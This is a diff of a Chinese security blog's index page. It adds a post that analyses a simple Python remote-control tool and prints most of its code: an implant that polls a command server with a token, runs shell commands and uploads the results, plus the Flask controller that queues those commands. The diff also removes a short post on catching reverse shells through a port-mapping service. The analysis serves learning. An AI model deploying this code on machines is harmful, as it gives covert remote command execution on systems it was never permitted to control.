@@ -255,6 +255,142 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/13/%E5%88%86%E6%9E%90%E4%B8%80%E6%AC%BE%E4%BB%85%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84python%E8%BF%9C%E6%8E%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/13/%E5%88%86%E6%9E%90%E4%B8%80%E6%AC%BE%E4%BB%85%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84python%E8%BF%9C%E6%8E%A7/" class="post-title-link" itemprop="url">分析一款仅能执行命令的python远控</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-13 15:16:54 / 修改时间：15:17:54" itemprop="dateCreated datePublished" datetime="2022-11-13T15:16:54+08:00">2022-11-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">-python</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="分析一款仅能执行命令的python远控"><a href="#分析一款仅能执行命令的python远控" class="headerlink" title="分析一款仅能执行命令的python远控"></a>分析一款仅能执行命令的python远控</h1><p>github上找了一个python的简单远控来进行分析，从而了解其中的一些原理。</p>
+<h1 id="client端"><a href="#client端" class="headerlink" title="client端"></a>client端</h1><p>首先我们分析被控端的代码</p>
+<p>太长我就不全部贴上来了，但会每一段都进行分析。</p>
+<p>首先是主函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] start client&quot;</span>)</span><br><span class="line">    client = Client()</span><br><span class="line">    client.run()</span><br></pre></td></tr></table></figure>
+
+<p>新建了一个类Client，使用了run方法，跟踪一下看看。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.server_ip = <span class="string">&quot;192.168.100.1&quot;</span></span><br><span class="line">        self.server_port = <span class="string">&quot;5050&quot;</span></span><br><span class="line">        self.base_url = <span class="string">&quot;http://&quot;</span>+self.server_ip+<span class="string">&quot;:&quot;</span>+self.server_port</span><br><span class="line">        self.token = <span class="string">&quot;bkq98&quot;</span></span><br><span class="line">        self.init_name()</span><br><span class="line">        self.sleep_time = <span class="number">3</span></span><br><span class="line">        self.cmd_id = <span class="literal">None</span></span><br><span class="line">        self.result = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先定义了类的一些基本的参数，比如服务端ip端口等。</p>
+<p>随后便是run()</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment"># 心跳</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        self.heartbeat()</span><br><span class="line">        time.sleep(self.sleep_time)</span><br></pre></td></tr></table></figure>
+
+<p>会不断的调用heartbeat()并且沉睡一段时间</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heartbeat</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment"># 有上次的执行结果就上传 没有就心跳 </span></span><br><span class="line">    <span class="comment"># server返回有命令且不是上一次的命令则 执行命令存储结果等待下一次心跳上传执行结果</span></span><br><span class="line">    url = self.base_url+<span class="string">&quot;/heartbeat/&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: self.token,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: self.name,</span><br><span class="line">        <span class="string">&quot;result&quot;</span>: self.result,</span><br><span class="line">        <span class="string">&quot;cmd_id&quot;</span>: self.cmd_id</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> self.result !=<span class="string">&quot;&quot;</span>:</span><br><span class="line">        data[<span class="string">&quot;result&quot;</span>] = self.result</span><br><span class="line">        self.result = <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    response = self.send_data(url, data)</span><br><span class="line">    <span class="keyword">if</span> response==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 有命令需要执行并返回</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">        server_data = json.loads(response.content)</span><br><span class="line">        cmd = server_data.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        cmd_id = server_data.get(<span class="string">&quot;cmd_id&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd_id == self.cmd_id:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> cmd:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] cmd: &quot;</span>+cmd)</span><br><span class="line">            self.result = <span class="built_in">str</span>(self.<span class="built_in">exec</span>(cmd))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] result: &quot;</span>+self.result)</span><br><span class="line">            self.cmd_id = cmd_id</span><br></pre></td></tr></table></figure>
+
+<p>首先是判断结果是否为空，如果为空则不作操作。</p>
+<p>然后调用<code>send_data()</code>发送心跳包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">self, url, data</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,json=data, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span>+e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>将定义好的data发送出去，并返回一个response。</p>
+<p>按照作者给的注释，如果返回状态值为200并且没有报错，则是需要返回执行的命令的结果。</p>
+<p>随后接受，服务端传过来的两个参数，cmd和cmd_id，验证cmd_id是否是自己的id，如果是的话则直接结束。</p>
+<p>然后调用<code>self.exec()</code>来执行命令，我们下面看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;sleep&quot;</span>):</span><br><span class="line">        self.sleep_time = <span class="built_in">int</span>(cmd.split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;time set ok&quot;</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;msf&quot;</span>):</span><br><span class="line">        <span class="comment">#TODO</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;msf set ok&quot;</span></span><br><span class="line">    <span class="keyword">return</span> run_cmd(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这里是一个功能检测，方便我们后期拓展。输入关键词就可以执行响应的操作，如果是sleep。则将自己的心跳时间修改为cmd最后一个参数。如果是msf，就写入联动msf的代码就好了，这里作者还没做好。</p>
+<p>如果是正常的执行命令则，调用run_cmd函数。这里我们跟如run_cmd函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, close_fds=<span class="literal">True</span>,</span><br><span class="line">                         start_new_session=<span class="literal">True</span>)</span><br><span class="line">    formats = <span class="string">&#x27;gbk&#x27;</span> <span class="keyword">if</span> platform.system() == <span class="string">&quot;Windows&quot;</span> <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = p.stdout.read()</span><br><span class="line">        p.wait()</span><br><span class="line">        <span class="keyword">return</span> result.decode(formats)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;命令执行错误&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里改成了一个子线程，根据系统来进行返回值的编码，然后执行第一个cmd，由于设置了shell=True,那我们的命令是可以带空格执行的。</p>
+<p>随后就是return命令执行结果，并且wait线程。</p>
+<p>接着看上面heartbeat()最后一步</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> cmd:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] cmd: &quot;</span>+cmd)</span><br><span class="line">                self.result = <span class="built_in">str</span>(self.<span class="built_in">exec</span>(cmd))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] result: &quot;</span>+self.result)</span><br><span class="line">                self.cmd_id = cmd_id</span><br></pre></td></tr></table></figure>
+
+<p>将self.result赋值成结果然后self.cmd_id赋值成cmd_id，这个cmd_id就是心跳检测的关键，在sleep了设定的数值之后，如果cmd_id，那么就不会返回新的结果，除非有新的cmd_id出现，否则不会执行任何命令。</p>
+<p>随后执行完命令之后继续沉睡指定时间，然后继续while循环</p>
+<p>最后就是有一个检测，如果用户输入ctrl+c,那么就会停止这个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctrl_c</span>(<span class="params">signum,frame</span>):</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] input ctrl c&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, ctrl_c)</span><br></pre></td></tr></table></figure>
+
+<h1 id="web端（控制端）"><a href="#web端（控制端）" class="headerlink" title="web端（控制端）"></a>web端（控制端）</h1><p>简单看了下，基于flask框架开发的。</p>
+<p><img src="/2022/11/13/%E5%88%86%E6%9E%90%E4%B8%80%E6%AC%BE%E4%BB%85%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84python%E8%BF%9C%E6%8E%A7/image-20221113145948432.png" alt="image-20221113145948432"></p>
+<p>主代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;192.168.100.1&quot;</span>, <span class="number">5050</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>定义你的服务器ip和访问的端口，不过这个没有密码，后续要使用的话，可以加入一些响应的鉴权措施。</p>
+<p>router.py路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    client_list = Clients.query.order_by(Clients.update_time).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;index.html&quot;</span>, clients = client_list)</span><br></pre></td></tr></table></figure>
+
+<p>做了个跳转，跳转到index.html页面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/heartbeat/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heartbeat</span>():</span></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    token = data.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token !=<span class="string">&quot;bkq98&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;&#125;)</span><br><span class="line">    <span class="comment"># 先判断是否需要注册client</span></span><br><span class="line">    name = data.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    client_result = data.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">    client_cmd_id = data.get(<span class="string">&quot;cmd_id&quot;</span>)</span><br><span class="line">    db_client = Clients.query.<span class="built_in">filter</span>(Clients.name==name, Clients.ip==ip).first()</span><br><span class="line">    <span class="keyword">if</span> db_client:</span><br><span class="line">        db_client.update_time = datetime.datetime.now()</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client = Clients()</span><br><span class="line">        client.name = name</span><br><span class="line">        client.ip = ip</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.add(client)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">if</span> client_result:</span><br><span class="line">        <span class="comment"># 上次结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] client: &quot;</span>+name+<span class="string">&quot; ip: &quot;</span>+ip+<span class="string">&quot; upload result: &quot;</span>+ client_result)</span><br><span class="line">        db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.<span class="built_in">id</span>==client_cmd_id).first()</span><br><span class="line">        db_echo_result.result = client_result</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="comment"># 获取是否有需要执行的命令</span></span><br><span class="line">    db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.client_name==name,EchoResult.ip==ip,EchoResult.result==<span class="literal">None</span>).first()</span><br><span class="line">    <span class="keyword">if</span> db_echo_result:</span><br><span class="line">        cmd_id = db_echo_result.<span class="built_in">id</span></span><br><span class="line">        cmd = db_echo_result.cmd</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] server issued cmd:&quot;</span>+cmd+<span class="string">&quot; name: &quot;</span> +name+<span class="string">&quot; ip: &quot;</span>+ip)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;cmd_id&quot;</span>:cmd_id, <span class="string">&quot;cmd&quot;</span>:cmd&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这个路由就是client端心跳包请求的地址</p>
+<p>首先会将心跳包传的参数存储到data变量中，随后会校检一下其中的token是否是我们设置的token，</p>
+<p>随后就是一系列的提取数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = data.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">ip = request.remote_addr</span><br><span class="line">client_result = data.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">client_cmd_id = data.get(<span class="string">&quot;cmd_id&quot;</span>)</span><br><span class="line">db_client = Clients.query.<span class="built_in">filter</span>(Clients.name==name, Clients.ip==ip).first()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> db_client:</span><br><span class="line">    db_client.update_time = datetime.datetime.now()</span><br><span class="line">    db.session.commit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    client = Clients()</span><br><span class="line">    client.name = name</span><br><span class="line">    client.ip = ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.session.add(client)</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
+
+<p>然后就是检测是否是数据库中已有的用户，如果是的话，就更新数据库的时间，如果不是，就添加一个用户。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> client_result:</span><br><span class="line">    <span class="comment"># 上次结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] client: &quot;</span>+name+<span class="string">&quot; ip: &quot;</span>+ip+<span class="string">&quot; upload result: &quot;</span>+ client_result)</span><br><span class="line">    db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.<span class="built_in">id</span>==client_cmd_id).first()</span><br><span class="line">    db_echo_result.result = client_result</span><br><span class="line">    db.session.commit()</span><br><span class="line"><span class="comment"># 获取是否有需要执行的命令</span></span><br><span class="line">db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.client_name==name,EchoResult.ip==ip,EchoResult.result==<span class="literal">None</span>).first()</span><br><span class="line"><span class="keyword">if</span> db_echo_result:</span><br><span class="line">    cmd_id = db_echo_result.<span class="built_in">id</span></span><br><span class="line">    cmd = db_echo_result.cmd</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] server issued cmd:&quot;</span>+cmd+<span class="string">&quot; name: &quot;</span> +name+<span class="string">&quot; ip: &quot;</span>+ip)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;cmd_id&quot;</span>:cmd_id, <span class="string">&quot;cmd&quot;</span>:cmd&#125;)</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这里就是首先获取了上次的结果，检测result参数是否是none，如果是的话，就是需要执行的新命令，返回过去并且等待下一次获取。</p>
+<p>其他的路由没有什么讲的，就是几个显示页面，显示一些信息。</p>
+<p>在<code>__int__.py</code>文件中定义了数据库文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">base_dir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">app.config[<span class="string">&quot;SQLALCHEMY_DATABASE_URI&quot;</span>] = <span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(base_dir, <span class="string">&quot;../&quot;</span>, <span class="string">&#x27;miansha3.db&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&quot;SQLALCHEMY_COMMIT_ON_TEARDOWN&quot;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> router</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context(): </span><br><span class="line">    db.init_app(app)</span><br><span class="line">    db.create_all()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实也比较简单，这款远控，毕竟只有执行命令的功能</p>
+<p>开发的大概思路就是被控端会定时发起心跳包到服务端，服务端接受心跳包中上一次执行命令的结果，并且返回新的命令。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/12/%E9%80%9A%E8%BF%87%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8q%E7%9B%BE%E5%8F%8D%E6%B2%99%E7%AE%B1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -444,82 +580,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/" class="post-title-link" itemprop="url">花生壳解决没有公网ip反弹shell</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-08 12:30:18 / 修改时间：12:32:06" itemprop="dateCreated datePublished" datetime="2022-11-08T12:30:18+08:00">2022-11-08</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="花生壳解决没有公网ip反弹shell"><a href="#花生壳解决没有公网ip反弹shell" class="headerlink" title="花生壳解决没有公网ip反弹shell"></a>花生壳解决没有公网ip反弹shell</h1><p>首先安装花生壳</p>
-<p>点击添加自定义映射</p>
-<p><img src="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/image-20221108122735113.png" alt="image-20221108122735113"></p>
-<p>设置好</p>
-<p><img src="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/image-20221108122832925.png" alt="image-20221108122832925"></p>
-<p>如果要反弹shell的话，可以选择模板为ssh</p>
-<p>内网主机要是是本地的话，就填写127.0.0.1</p>
-<p>如果是虚拟机就填写虚拟的本来的内网地址。</p>
-<p>设置好之后在本机的软件上开启映射，打开nc的监听，直接把反弹shell弹到花生壳分配的公网ip上面就可以了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -591,7 +651,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
